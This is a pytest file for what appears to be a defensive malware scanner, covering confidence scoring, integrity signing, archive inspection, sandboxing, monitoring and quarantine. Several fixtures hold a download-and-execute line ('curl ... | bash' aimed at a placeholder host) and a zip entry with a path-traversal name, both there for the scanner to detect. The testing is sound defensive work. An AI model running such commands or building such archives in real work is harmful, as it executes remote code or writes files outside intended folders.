from pathlib import Path


def test_confidence_fuses_independent_evidence():
    from bioaegis.confidence import fuse

    result = fuse(frozenset({"download-and-execute", "reverse-shell"}), external_hits=1, independent_sources=1)
    assert result.score >= 80
    assert result.level == "HIGH"


def test_confidence_signature_is_high():
    from bioaegis.confidence import fuse

    result = fuse(frozenset({"malware_signature"}))
    assert result.level == "HIGH"
    assert result.score == 100


def test_behavior_clustering_groups_similar_observations():
    from bioaegis.behavior import cluster, similarity

    items = [
        frozenset({"network", "reverse-shell"}),
        frozenset({"network", "reverse-shell", "executable"}),
        frozenset({"persistence"}),
    ]
    assert similarity(items[0], items[1]) > 0.5
    assert cluster(items, threshold=0.5)[0] == [0, 1]


def test_integrity_signature_detects_tampering(tmp_path):
    from bioaegis.integrity import sign, verify

    key = tmp_path / "key"
    payload = b"validated policy\n"
    signature = sign(payload, key)
    assert verify(payload, signature, key)
    assert not verify(payload + b"tampered", signature, key)


def test_memory_signature_fails_closed_after_tampering(tmp_path):
    from bioaegis.memory import ImmuneMemory
    from bioaegis.models import Countermeasure

    memory_path = tmp_path / "memory.json"
    key_path = tmp_path / "key"
    memory = ImmuneMemory(memory_path, key_path=key_path)
    memory.remember(Countermeasure("rule", frozenset({"x"}), ("QUARANTINE_FILE", "VERIFY_QUARANTINE"), "fixture"))
    memory.save()
    memory_path.write_text(memory_path.read_text(encoding="utf-8").replace("rule", "tampered"), encoding="utf-8")

    loaded = ImmuneMemory(memory_path, key_path=key_path)
    loaded.load()
    assert loaded.entries == ()


def test_archive_scanner_detects_path_traversal(tmp_path):
    import zipfile

    from bioaegis.archive_scanner import inspect

    archive = tmp_path / "fixture.zip"
    with zipfile.ZipFile(archive, "w") as handle:
        handle.writestr("../../escape.txt", "fixture")
    assert "archive-path-traversal" in inspect(str(archive))


def test_archive_scanner_detects_script_pattern_without_extracting(tmp_path):
    import zipfile

    from bioaegis.archive_scanner import inspect

    archive = tmp_path / "fixture.zip"
    with zipfile.ZipFile(archive, "w") as handle:
        handle.writestr("run.sh", "curl https://example.invalid/a | bash\n")
    assert "archive-download-execute" in inspect(str(archive))


def test_sandbox_manifest_disables_execution(tmp_path):
    from bioaegis.sandbox import AnalysisSandbox

    manifest = AnalysisSandbox(tmp_path / "sandbox").create(tmp_path / "sample")
    data = manifest.read_text(encoding="utf-8")
    assert '"execution": "disabled"' in data
    assert '"network": "disabled"' in data


def test_specialist_provider_contract():
    from bioaegis.specialist_api import DeterministicSpecialistProvider, SpecialistProvider

    assert issubclass(DeterministicSpecialistProvider, SpecialistProvider)


def test_realtime_monitor_can_watch_temp_directory(tmp_path):
    from bioaegis.realtime import InotifyMonitor

    try:
        with InotifyMonitor(tmp_path) as monitor:
            sample = Path(tmp_path) / "event.txt"
            sample.write_text("fixture", encoding="utf-8")
            events = monitor.poll(timeout=1.0)
    except OSError:
        return
    assert sample in events or any(item.name == "event.txt" for item in events)


def test_realtime_monitor_reports_no_spurious_overflow(tmp_path):
    from bioaegis.realtime import InotifyMonitor

    try:
        with InotifyMonitor(tmp_path) as monitor:
            (tmp_path / "event.txt").write_text("fixture", encoding="utf-8")
            monitor.poll(timeout=1.0)
            assert monitor.overflowed is False
    except OSError:
        return


def test_installation_manifest_detects_modified_file(tmp_path):
    from bioaegis.tamper import verify_manifest, write_manifest

    package = tmp_path / "install"
    (package / "bioaegis").mkdir(parents=True)
    (package / "service").mkdir()
    (package / "assets").mkdir()
    (package / "pyproject.toml").write_text("name='bioaegis'\n", encoding="utf-8")
    (package / "bioaegis" / "core.py").write_text("safe\n", encoding="utf-8")
    write_manifest(package, key_path=tmp_path / "key")

    assert verify_manifest(package, key_path=tmp_path / "key")[0]
    (package / "bioaegis" / "core.py").write_text("tampered\n", encoding="utf-8")
    ok, issues = verify_manifest(package, key_path=tmp_path / "key")
    assert not ok
    assert any("modified" in issue for issue in issues)


def test_automatic_protection_holds_medium_confidence(tmp_path):
    from bioaegis.host_engine import HostEngine
    from bioaegis.memory import ImmuneMemory
    from bioaegis.quarantine import Quarantine

    sample = tmp_path / "fixture.sh"
    sample.write_text("#!/bin/sh\ncurl https://example.invalid/a | bash\n", encoding="utf-8")
    sample.chmod(0o700)

    engine = HostEngine(ImmuneMemory(tmp_path / "memory.json"))
    engine.quarantine = Quarantine(tmp_path / "quarantine")
    result = engine.scan(str(sample), quarantine=True, automatic=True)[0]

    assert result.confidence_level == "LOW" or result.confidence_level == "MEDIUM"
    assert result.quarantined is False
    assert sample.exists()
